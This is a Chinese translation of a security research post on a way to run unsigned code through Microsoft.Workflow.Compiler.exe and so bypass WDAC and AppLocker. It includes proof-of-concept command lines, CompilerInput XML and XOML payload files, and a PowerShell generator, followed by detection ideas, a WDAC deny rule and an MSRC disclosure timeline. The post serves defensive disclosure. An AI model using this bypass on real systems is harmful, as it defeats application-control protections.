> 原文链接: https://www.anquanke.com//post/id/157299 


# 如何利用Microsoft.Workflow.Comiler.exe执行未签名的任意代码


                                阅读量   
                                **130989**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：posts.specterops.io
                                <br>原文地址：[https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t0174844606cd037f11.jpg)](https://p5.ssl.qhimg.com/t0174844606cd037f11.jpg)

## 一、前言

`Microsoft.Workflow.Compiler.exe`是.NET Framework中默认包含的一款实用工具，攻击者可以以XOML文件形式来使用序列化工作流，再结合由序列化编译器参数组成的一个XML文件，最终借助该程序执行未经签名的任意代码。本文介绍的这种绕过机制与Casey Smith之前提到的[msbuild.exe绕过技术](https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html)类似。

`Microsoft.Workflow.Compiler.exe`需要传入两个命令行参数，第一个参数为包含序列化`CompilerInput`对象的一个XML类文件的具体路径，第二个参数为待写入序列化编译结果的文件路径。

之所以能够执行任意代码，原因在于`Microsoft.Workflow.Compiler.exe`会调用攻击者提供的.NET assembly（程序集）中的[Assembly.Load(byte[])](https://msdn.microsoft.com/en-us/library/h538bck7%28v=vs.110%29.aspx)方法（并没有检查代码完整性）。然而单纯加载assembly文件并不会造成代码执行，当以XOML文件形式提供C#（或者VB.Net）代码时，在加载assembly过程中会调用类构造函数。为了实现代码执行，唯一的限制是类构造器必须派生自`System.Workflow.ComponentModel.Activity`类。

这种技术可以绕过许多产品上的代码完整性增强机制，比如Windows Defender Application Control（包括Windows 10S在内）、AppLocker以及其他应用程序白名单产品。我最近已经不怎么关心如何绕过应用白名单，而是重点关注如何通过签名的、信誉度高的内置应用来执行未签名的任意代码。绕过（带有DLL增强检测机制）的应用程序白名单刚好符合我自己新设定的研究标准。

大家可以观看[此视频](https://youtu.be/gBLtcXiOHJ0)了解如何在打全补丁的Windows 10S系统上执行任意代码。这个视频的目的是显示如何绕过代码完整性强制机制，而不是演示如何在10S系统上实现端到端的远程投递攻击。



## 二、PoC

攻击过程可以分为如下几个步骤：

1、将某个XOML文件保存在磁盘上。XOML文件中包含攻击者提供的待编译、加载以及调用的C#或VB.NET代码。恶意执行逻辑需要放在类构造函数中，该类派生自`System.Workflow.ComponetModel.Activity`类。

2、将包含序列化`CompilerInput`对象的XML文件保存在磁盘上。

3、传入XML文件的具体路径，执行`Microsoft.Workflow.Compiler.exe`。

比如，我们可以通过如下命令来运行`Microsoft.Workflow.Compiler.exe`：

```
C:WindowsMicrosoft.NetFramework64v4.0.30319Microsoft.Workflow.Compiler.exe test.xml results.xml
```

`test.xml`文件内容如下：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"&gt;
&lt;files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"&gt;
&lt;d2p1:string&gt;test.xoml&lt;/d2p1:string&gt;
&lt;/files&gt;
&lt;parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler"&gt;
&lt;assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;&lt;/coreAssemblyFileName&gt;
&lt;embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/generateExecutable&gt;
&lt;generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;true&lt;/generateInMemory&gt;
&lt;includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/includeDebugInformation&gt;
&lt;linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;&lt;/outputName&gt;
&lt;tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/treatWarningsAsErrors&gt;
&lt;warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;-1&lt;/warningLevel&gt;
&lt;win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
&lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;
&lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;
&lt;d2p1:compilerOptions i:nil="true" /&gt;
&lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;
&lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;
&lt;d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" /&gt;
&lt;d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" /&gt;
&lt;d2p1:mtInfo i:nil="true" /&gt;
&lt;d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" /&gt;
&lt;/parameters&gt;
&lt;/CompilerInput&gt;
```

`test.xoml`文件内容如下：

```
&lt;SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="MyWorkflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow"&gt;
    &lt;CodeActivity x:Name="codeActivity1" /&gt;
    &lt;x:Code&gt;&lt;![CDATA[
    public class Foo : SequentialWorkflowActivity `{`
     public Foo() `{`
            Console.WriteLine("FOOO!!!!");
        `}`
    `}`
    ]]&gt;&lt;/x:Code&gt;
&lt;/SequentialWorkflowActivity&gt;
```

`Microsoft.Workflow.Compiler.exe`运行后会编译内联的C#代码，加载编译后的DLL，然后调用`Foo`构造函数，整个过程并没有去检查代码完整性。



## 三、发现过程

我偶尔喜欢扫描系统，检查新的或者已有的一些程序会不会引用不安全的.NET方法（如`Assembly.Load(byte[])`）。我编写过较粗糙的一些[工具](https://gist.github.com/mattifestation/67435063004effaac02809506890c7bb)来检查这些可执行文件，工具返回的结果中就包含`System.Workflow.ComponentModel.dll`。之前我也在输出结果中看到过这个DLL文件，但当时我太懒了，没有去分析哪个EXE引用了这个assembly。

因此第一步就是判断谁调用了`Assembly.Load(byte[])`。这个任务并不难，我们可以使用[dnSpy](https://github.com/0xd4d/dnSpy)工具，在`System.Workflow.ComponentModel.Compiler.WorkflowCompilerInternal.Compile`方法中找到如下片段：

[![](https://p3.ssl.qhimg.com/t01a2eda985fd79eda9.png)](https://p3.ssl.qhimg.com/t01a2eda985fd79eda9.png)

跟进`GenerateLocalAssembly`方法的执行流程，我们可以看到该方法最终会调用标准的.NET编译/加载方法，之前我在一篇[文章](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html)中提到过这些方法会调用`Assembly.Load(byte[])`：

[![](https://p2.ssl.qhimg.com/t01bf93a6d237d937bd.png)](https://p2.ssl.qhimg.com/t01bf93a6d237d937bd.png)

单纯加载assembly并不能让程序帮我们执行任意代码，有些时候为了加载assembly我们必须先满足一些条件。幸运的是，`System.Workflow.ComponentModel.Compiler. XomlCompilerHelper.InternalCompileFromDomBatch`方法会遍历已加载assembly中的每个类型，实例化继承自`System.Workflow.ComponentModel.Activity`类的每个实例，如下图所示：

[![](https://p5.ssl.qhimg.com/t0196388f38a2c9433d.png)](https://p5.ssl.qhimg.com/t0196388f38a2c9433d.png)

[![](https://p2.ssl.qhimg.com/t01bd9c657735fe51c9.png)](https://p2.ssl.qhimg.com/t01bd9c657735fe51c9.png)

此时我貌似看到了能够执行任意代码的代码点，接下来我们要澄清需要使用哪种格式，才能满足程序所需的编译器输入数据以及XOML工作流文件。

当`Microsoft.Workflow.Compiler.exe`启动时，会将第一个参数传递给`ReadCompilerInput`方法，后者收到文件路径后，会将其反序列化为`CompilerInput`对象：

[![](https://p4.ssl.qhimg.com/t0188ae4fd1f460441c.png)](https://p4.ssl.qhimg.com/t0188ae4fd1f460441c.png)

因此现在的问题是，我们如何才能生成序列化的`CompilerInput`对象？幸运的是，我发现了一个内部方法`Microsoft.Workflow.Compiler.CompilerWrapper.SerializeInputToWrapper`，可以帮我们完成这个任务：

[![](https://p0.ssl.qhimg.com/t01f9d3cc946e624f61.png)](https://p0.ssl.qhimg.com/t01f9d3cc946e624f61.png)

我使用反射（reflection）技术来访问该方法，编写了一个PowerShell函数来自动生成XML文件：

```

```

```
function New-CompilerInputXml `{`
&lt;#
.SYNOPSIS

Creates a an XML file consisting of a serialized CompilerInput object.

.DESCRIPTION

New-CompilerInputXml creates an XML file consisting of compiler options. This file is required as the first argument for Microsoft.Workflow.Compiler.exe.

.PARAMETER XOMLPath

Specifies the path to the target XOML file. This can be a relative or absolute path. This path will be included in the resulting XML file that New-CompilerInputXml outputs.

.PARAMETER OutputPath

Specifies the path to which New-CompilerInputXml will save the serialized CompilerInput object.

.EXAMPLE

New-CompilerInputXml -XOMLPath C:Testfoo.xoml -OutputPath test.xml

Outputs a serialized CompilerInput object to test.xml and specifies a full path to a XOML assembly reference.

.EXAMPLE

New-CompilerInputXml -XOMLPath foo.xoml -OutputPath test.txt

Outputs a serialized CompilerInput object to test.txt and specifies a XOML assembly reference using a relative path. Note that Microsoft.Workflow.Compiler.exe doesn't care about the extension supplied in the first argument.

.OUTPUTS

System.IO.FileInfo

Outputs a FileInfo object to serve as confirmation that the resulting serialized XML wil was created.
#&gt;

    [OutputType([System.IO.FileInfo])]
    param (
        [String]
        [ValidateNotNullOrEmpty()]
        $XOMLPath = 'test.xoml',

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $OutputPath
    )

    # This assembly won't be loaded by default. We need to load
    # it in order to get access to the WorkflowCompilerParameters class.
    Add-Type -AssemblyName 'System.Workflow.ComponentModel'

    # This class contains the properties we need to specify for Microsoft.Workflow.Compiler.exe
    $WFCompilerParams = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters

    # Necessary to get Microsoft.Workflow.Compiler.exe to call Assembly.Load(byte[])
    $WFCompilerParams.GenerateInMemory = $True

    # Full path to Microsoft.Workflow.Compiler.exe that we will load and access a non-public method from
    $WorkflowCompilerPath = [Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + 'Microsoft.Workflow.Compiler.exe'

    # Load the assembly
    $WFCAssembly = [Reflection.Assembly]::LoadFrom($WorkflowCompilerPath)

    # This is the helper method that will serialize the CompilerInput object to disk
    $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')

    $TempFile = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $WFCompilerParams, [String[]] @(,$OutputPath)))

    Move-Item $TempFile $OutputPath -PassThru
`}`
```

实际上我们只需要改变序列化`CompilerInput`对象中XOML文件的路径/文件名即可。

我们要做的最后一件事情就是澄清如何将C#代码嵌入XOML文件中，首先我们得知道什么是XOML文件。幸运的是，我发现有篇文章中提到可以将代码嵌入XOML文件中。经过多次修改文件后，我终于能够让`Microsoft.Workflow.Compiler.exe`来调用我们的“恶意”构造函数。

这种技术的发现过程就这么简单。我在Windows 10S上做了测试，发现可以执行未签名的任意代码。目前为止，我依然不知道`Microsoft.Workflow.Compiler.exe`的真正功能是什么，也不知道为什么有人需要使用XOML文件，这并不是我的关注重点。目前关于这个程序的公开资料还是比较少，我猜测该程序主要是在微软内部使用。



## 四、检测及规避策略

为了构造检测这种技术的可靠方法，我们需要识别出使用这种技术所需的最小组件集合。

> `Microsoft.Workflow.Compiler.exe`需要使用两个参数。

虽然这句话有点废话，但重要性不言而喻，因为这也是攻击者能够通过磁盘上文件最终控制`Microsoft.Workflow.Compiler.exe`的原因所在。

由于攻击者会千方百计滥用该程序，因此防御方不应该只以来文件名来构建检测规则。我曾写过一篇[文章](https://posts.specterops.io/what-is-it-that-makes-a-microsoft-executable-a-microsoft-executable-b43ac612195e)，介绍如何构建针对可能被滥用的微软应用的可靠检测技术。幸运的是，使用`Microsoft.Workflow.Compiler.exe`本身就不是一种常见行为。

经过测试，我发现即使将`Microsoft.Workflow.Compiler.exe`拷贝到另一个目录并重命名，该程序也能正常执行。

> `Microsoft.Workflow.Compiler.exe`会调用assembly的编译方法。

与PowerShell中的[Add-Type](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html)以及[msbuild](https://web.archive.org/web/20161212224652/http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html)类似，程序会调用.NET的内部编译方法来编译并加载XOML文件中内置的C#代码。如果C#编译成功，`csc.exe`会以`Microsoft.Workflow.Compiler.exe`子进程的形式运行。我们还可以在XOML载荷中使用嵌入式VB.Net代码，只需要将序列化`CompilerInput` XML文件`languageToUse`属性中的`CSharp`替换为`VB`或者`VisualBasic`，然后在XOML文件中嵌入VB.Net代码即可。这样处理后，`vbc.exe`将成为`Microsoft.Workflow.Compiler.exe`的子进程。使用VB.Net载荷的`test.xoml` PoC文件如下所示：

```
&lt;SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="MyWorkflow" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow"&gt;
    &lt;CodeActivity x:Name="codeActivity1" /&gt;
    &lt;x:Code&gt;&lt;![CDATA[
    Class Foo : Inherits SequentialWorkflowActivity
        Public Sub New()
            Console.WriteLine("FOOO!!!!")
        End Sub
    End Class
    ]]&gt;&lt;/x:Code&gt;
&lt;/SequentialWorkflowActivity&gt;
```

从技术角度来看，使用assembly编译方法还有另一个方面值得注意，这个过程会编译C#/VB.Net代码，生成一个临时的DLL并快速删除。端点安全产品可以通过检测这些临时性DLL来检测这种滥用行为。

> `Microsoft.Workflow.Compiler.exe`参数可以使用任意文件扩展名。

如果我们想根据命令行字符串来构建检测规则，需要注意程序接受的参数不需要以`.xml`作为文件扩展名。攻击者可以使用任意文件扩展名（如`.txt`）作为参数传递给程序。

> 传入的XOML文件无需以`.xoml`作为扩展名，可以使用文件扩展名。

这种技术需要使用磁盘上的两个文件（`CompilerInput`内容以及`C#/VB.Net`载荷文件）才能达到代码运行效果，但这些文件可以使用任意扩展名，因此我们并不推荐使用`.xoml`文件来构建检测技术。

比如，攻击者可以使用如下命令来运行这个程序：

```
C:WindowsMicrosoft.NETFramework64v4.0.30319Microsoft.Workflow.Compiler.exe test.txt results.blah
```

`test.txt`的内容为：

```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"&gt;
  &lt;files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"&gt;
    &lt;d2p1:string&gt;blah.foo&lt;/d2p1:string&gt;
  &lt;/files&gt;
  &lt;parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler"&gt;
    &lt;assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;&lt;/coreAssemblyFileName&gt;
    &lt;embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/generateExecutable&gt;
    &lt;generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;true&lt;/generateInMemory&gt;
    &lt;includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/includeDebugInformation&gt;
    &lt;linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;&lt;/outputName&gt;
    &lt;tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;false&lt;/treatWarningsAsErrors&gt;
    &lt;warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"&gt;-1&lt;/warningLevel&gt;
    &lt;win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" /&gt;
    &lt;d2p1:checkTypes&gt;false&lt;/d2p1:checkTypes&gt;
    &lt;d2p1:compileWithNoCode&gt;false&lt;/d2p1:compileWithNoCode&gt;
    &lt;d2p1:compilerOptions i:nil="true" /&gt;
    &lt;d2p1:generateCCU&gt;false&lt;/d2p1:generateCCU&gt;
    &lt;d2p1:languageToUse&gt;CSharp&lt;/d2p1:languageToUse&gt;
    &lt;d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" /&gt;
    &lt;d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" /&gt;
    &lt;d2p1:mtInfo i:nil="true" /&gt;
    &lt;d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" /&gt;
  &lt;/parameters&gt;
&lt;/CompilerInput&gt;
```

`blah.foo`的内容如下（纯C#代码）：

```
using System;
using System.Workflow.Activities;
public class Foo : SequentialWorkflowActivity `{`
    public Foo() `{`
        Console.WriteLine("FOOO!!!!");
    `}`
`}`
```



## 五、检测方法

我们推荐从以下几方面来构建可靠的、高效的以及准确的检测技术，用来检测`Microsoft.Workflow.Compiler.exe`的滥用行为：

1、审计当前环境中`Microsoft.Workflow.Compiler.exe`的使用情况，正常环境中很少会用到这个程序，但这点需要用户自己去核实。每次运行`Microsoft.Workflow.Compiler.exe`时都应该产生告警事件。需要注意的是攻击者可以任意移动并重命名这个程序，因此需要构建相应的[检测规则](https://posts.specterops.io/what-is-it-that-makes-a-microsoft-executable-a-microsoft-executable-b43ac612195e)。

2、恶意运行`Microsoft.Workflow.Compiler.exe`时会生成`csc.exe`或者`vbc.exe`子进程。

3、在构建或部署Yara规则方面，如果文本文件中包含`&lt;CompilerInput`则可以作为可疑标志。攻击者从`CompilerInput`文件中获取的有价值的信息为实际载荷文件的具体路径，而非载荷文件本身，而载荷文件很有可能至少会包含`Activity`关键词。

这里提一下，这些检测建议只适用于本文描述的这种绕过技术。有许多种攻击场景可以绕过这些检测方法，比如当攻击者利用`CompilerInput`或者`WorkflowCompilerParameters`类中的反序列化漏洞实现代码执行时，就可以规避#2及#3建议的检测方法。

如果大家想测试针对这种技术的检测方法，我也写了一个载荷生成器，大家可以访问[此链接](https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba)下载。



## 六、缓解措施

微软决定不修复这种Windows Defender Application Control（WDAC）绕过方法，我个人对此表示理解，毕竟我只是（以非预期的方式）滥用了系统的正常功能而已。考虑到`Microsoft.Workflow.Compiler.exe`现在很少会被使用，开发者很可能在未来的.NET版本中删掉这个程序。然而即使开发者移除该程序，依然存在潜在的威胁，攻击者可以将EXE投放到目标主机上，虽然程序未经微软签名，但的确包含微软的Authenticode签名。幸运的是，Windows Defender Application Control支持用户将已签名的程序列入黑名单中。

为了生成适用于WDAC策略的黑名单，我们需要运行如下命令：

```
# Have I mentioned how much I hate Get-SystemDriver? I always have to resort to hacks to extract the info I want
$Signatures = Get-SystemDriver -ScanPath C:WindowsMicrosoft.NETFramework64v4.0.30319 -UserPEs -NoShadowCopy
# Extract the signautre info for just Microsoft.Workflow.Compiler.exe
$SignatureInfo = $Signatures.GetEnumerator() | Where-Object `{` $_.UserMode -and ($_.FileName -eq 'Microsoft.Workflow.Compiler.exe') `}`
# Create an explicit block rule based on Original Filename
$DenyRule = New-CIPolicyRule -DriverFiles $SignatureInfo -Level FileName -Deny
New-CIPolicy -FilePath BlockRules.xml -Rules $DenyRule -UserPEs
```

这样处理后，原始文件名为`Microsoft.Workflow.Compiler.exe`的任意程序都会被阻止。这种方法非常强大，虽然攻击者可以修改这个属性，但就会破坏掉程序的签名，此时程序自然也会被阻止。然而这个规则假设所有版本的`Microsoft.Workflow.Compiler.exe`都使用`Microsoft.Workflow.Compiler.exe`作为原始文件名。

微软一直在维护一个[黑名单策略](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)，我们可以将官方策略[融入](http://www.exploit-monday.com/2016/09/using-device-guard-to-mitigate-against.html)自己的策略中，这些策略似乎也会定期更新并合并到Windows 10S策略中，但我并不清楚更新的具体频率。



## 七、时间线

SpecterOps会定期将信息[公开](https://posts.specterops.io/a-push-toward-transparency-c385a0dd1e34)，我们承认攻击者在一些技术公开后动作非常迅速。因此在公开新型攻击技术前，我们会定期向厂商报告问题，提供足够多的时间来缓解问题，并且通知值得信赖的厂商来确保检测技术能尽快推送给所有的客户。

由于这种绕过技术会影响Windows Defender Application Control（MSRC提供的安全功能），因此我们将该问题反馈给微软。具体时间线如下：
- 2018年7月27日 —报告发送给MSRC
- 2018年7月28日 —MSRC确认收到报告
- 2018年7月30日 — MSRC创建案例编号
- 2018年8月5日 — MSRC复现该问题，建议将其添加到Windows Defender Application Control的[阻止列表](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)中，暗示他们不会解决这个问题
- 2018年8月13日 — 将本文草稿发给MSRC参考，共同协商本文发布日期为8月17日
- 2018年8月17日— 本文发布